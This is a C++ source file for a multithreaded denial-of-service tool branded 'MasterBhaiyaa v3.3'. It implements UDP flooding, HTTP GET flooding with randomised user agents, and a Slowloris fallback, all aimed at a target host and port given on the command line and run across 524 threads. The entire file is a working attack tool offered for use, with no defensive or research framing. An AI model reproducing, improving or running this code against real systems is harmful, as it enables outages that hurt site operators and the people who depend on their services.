#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define THREAD_COUNT 524
#define DEFAULT_PAYLOAD_SIZE 24
#define BINARY_NAME "MasterBhaiyaa"

std::atomic<bool> stop_flag(false);

struct AttackConfig {
    std::string target;
    int port;
    int duration;
    int payload_size;
};

// Signal handler
void handle_signal(int signal) {
    std::cout << "\n[!] Interrupt received. Stopping attack...\n";
    stop_flag = true;
}

// Check if target is an IP
bool is_ip(const std::string &target) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, target.c_str(), &(sa.sin_addr)) != 0;
}

// Generate random payload
std::vector<uint8_t> generate_payload(int size) {
    std::vector<uint8_t> payload(size);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint8_t> dis(0x20, 0x7E);

    for (int i = 0; i < size; ++i) {
        payload[i] = dis(gen);
    }
    return payload;
}

// Generate random user-agent
std::string random_user_agent() {
    std::vector<std::string> user_agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)"
    };
    return user_agents[rand() % user_agents.size()];
}

// UDP Flood Attack (L4)
void udp_attack(const AttackConfig &config) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config.port);
    target_addr.sin_addr.s_addr = inet_addr(config.target.c_str());

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        std::vector<uint8_t> payload = generate_payload(config.payload_size);
        sendto(sock, payload.data(), payload.size(), 0, 
               (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sock);
}

// HTTP Flood Attack (L7)
void http_flood(const AttackConfig &config) {
    struct sockaddr_in server;
    struct hostent *host;

    host = gethostbyname(config.target.c_str());
    if (!host) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(config.port);
    server.sin_addr = *((struct in_addr *)host->h_addr);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            close(sock);
            continue;
        }

        std::string request = "GET / HTTP/1.1\r\n"
                              "Host: " + config.target + "\r\n"
                              "User-Agent: " + random_user_agent() + "\r\n"
                              "Connection: keep-alive\r\n"
                              "\r\n";

        send(sock, request.c_str(), request.length(), 0);
        close(sock);
    }
}

// Slowloris Attack (L7 fallback)
void slowloris(const AttackConfig &config) {
    struct sockaddr_in server;
    struct hostent *host;

    host = gethostbyname(config.target.c_str());
    if (!host) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(config.port);
    server.sin_addr = *((struct in_addr *)host->h_addr);

    std::vector<int> sockets;
    for (int i = 0; i < 150; ++i) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            close(sock);
            continue;
        }

        std::string request = "GET / HTTP/1.1\r\n"
                              "Host: " + config.target + "\r\n"
                              "User-Agent: " + random_user_agent() + "\r\n";

        send(sock, request.c_str(), request.length(), 0);
        sockets.push_back(sock);
    }

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        for (auto sock : sockets) {
            send(sock, "X-a: b\r\n", 8, 0);
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    for (auto sock : sockets) {
        close(sock);
    }
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: ./MasterBhaiyaa <target> <port> <duration> <payload_size>\n";
        return EXIT_FAILURE;
    }

    AttackConfig config;
    config.target = argv[1];
    config.port = std::stoi(argv[2]);
    config.duration = std::stoi(argv[3]);
    config.payload_size = std::stoi(argv[4]);

    if (!is_ip(config.target) && gethostbyname(config.target.c_str()) == nullptr) {
        std::cerr << "Invalid target: " << config.target << "\n";
        return EXIT_FAILURE;
    }

    std::signal(SIGINT, handle_signal);

    std::cout << "=====================================\n";
    std::cout << "      MasterBhaiyaa v3.3 - Auto L4/L7     \n";
    std::cout << "=====================================\n";
    std::cout << "Target: " << config.target << ":" << config.port << "\n";
    std::cout << "Duration: " << config.duration << " seconds\n";
    std::cout << "Payload Size: " << config.payload_size << " bytes\n";
    std::cout << "Threads: " << THREAD_COUNT << "\n";
    std::cout << "Attack Mode: " << (is_ip(config.target) ? "UDP (L4)" : "HTTP (L7)") << "\n";
    std::cout << "=====================================\n\n";

    std::vector<std::thread> threads;

    for (int i = 0; i < THREAD_COUNT; ++i) {
        if (is_ip(config.target)) {
            threads.emplace_back(udp_attack, config);
        } else {
            try {
                threads.emplace_back(http_flood, config);
            } catch (...) {
                std::cout << "[!] HTTP attack failed! Switching to Slowloris...\n";
                threads.emplace_back(slowloris, config);
            }
        }
        std::cout << "[+] Thread " << i + 1 << " launched.\n";
    }

    for (auto &thread : threads) {
        thread.join();
    }

    std::cout << "\n[✔] Attack completed.\n";
    std::cout << "© @MasterBhaiyaa\n";

    return EXIT_SUCCESS;
}
